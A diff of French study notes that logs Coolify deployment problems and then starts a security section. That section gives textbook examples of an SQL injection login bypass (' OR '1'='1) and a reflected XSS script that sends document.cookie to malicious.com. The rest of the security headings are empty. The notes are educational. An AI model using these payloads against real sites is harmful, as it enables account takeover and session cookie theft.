@@ -1,5 +1,7 @@
 # deploiement :
 
+### historique des actions et pbm rencontrés
+
 - lancement du deploiement sur coolify à partir du repo github publique
 - **erreur :**
 	- npm n'arrive pas à acceder aux package.json
@@ -16,13 +18,7 @@
 - resoud le pbm, push sur github, redeploi
 - ca marche ! -> le site est en ligne, sur l'url generee par coolify
 - **erreur :**
-	- le site s'affiche, mais pas les infos de la ddb
-	- on verra demain
-
----
-
-- redeploi le lendemain
-- **erreur :**
+	- la ddb n'envoit pas ses infos
 	- ddb ne trouve le dossier `pg_notify`
 	- pbm vient du volume de la ddb "psql" qui n'est pas vide donc pas reinstallé
 	- il faudra l'enlever de github, pour l'instant je le vide
@@ -37,9 +33,9 @@
 	- build fonctionne, pbms de .env et url resolu momentanement
 - **erreur :**
 	- aucune info ne revient du back
-- petite pause
 
----
+
+### liste des problemes et de leur resolution
 
 - resoudre les pbm que recontre coolify pour le deploiement :
 	1. il commence par creer des dossier ./BACK/db/migration.sql/ et ./BACK/db/seeding.sql/ au lieu de fichiers, parce qu'il les voit dans le docker-compose.yml en tant que "bind mount files" et il croit que ce sont des volumes
@@ -118,3 +114,43 @@
 - maintenant les variables d'environnements sont dans tout l'environnement de chaque container, au lieu d'etre dans un fichier
 - il ne reste plus qu'à les rentrer dans coolify avant de deployer
 - ok
+
+
+# securité :
+
+## types de failles de securité :
+
+1. **injection SQL**
+   injecter une requete sql "malveillante", qui fait fonctionner la base de donnee d'une maniere imprevue
+	 ex de requete avec 2 champs de formulaire pour se connecter 'username' et 'password' :
+	    "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+			si on remplis uniquement le 'username' avec [' OR '1'='1], ca donne cette requete :
+			SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
+			1=1 est toujours vraie donc on peut se connecter avec n'importe username sans le mot de passe
+2. **xss**
+   injecter du code "malveillant" sur une page vue par un autre utilisateur, par exemple pour recuperer ses cookies de session
+   ex d'attaque xss sur un site web qui permet de faire une recherche :
+	    1. le site possede une page avec un champ de recherche, on peut chercher "babar" par exemple :
+			   `recherche: [babar]`
+			2. lorsqu'on valide la recherche, elle est envoyé avec la methode GET au back :
+			   `https://exemple.com/search?query=babar`
+			3. le site affiche ensuite la recherche en plus des resultats :
+				 `les resultats pour votre recherche "babar" sont etc...`
+			4. donc si on envoit cette url à quelqu'un, il va voir les resultats s'afficher :
+			   `https://exemple.com/search?query=babar`
+				 `les resultats pour votre recherche "babar" sont etc...`
+			5. au lieu d'envoyer "babar" dans le champs de recherche, on peut y mettre un script :
+			   [<script>document.location='http://malicious.com/steal?cookie='+document.cookie</script>]
+				 les resultats pour votre recherche <script>...</script>
+				 -> le script est executé
+				 en l'occurence, il vole les cookies de session de la personne, on peut donc ensuite se connecter a son compte
+3. **csrf**
+   
+4. **brute force**
+   
+5. **man in the middle**
+   
+6. **ddos**
+   
+7. **idor**
+   
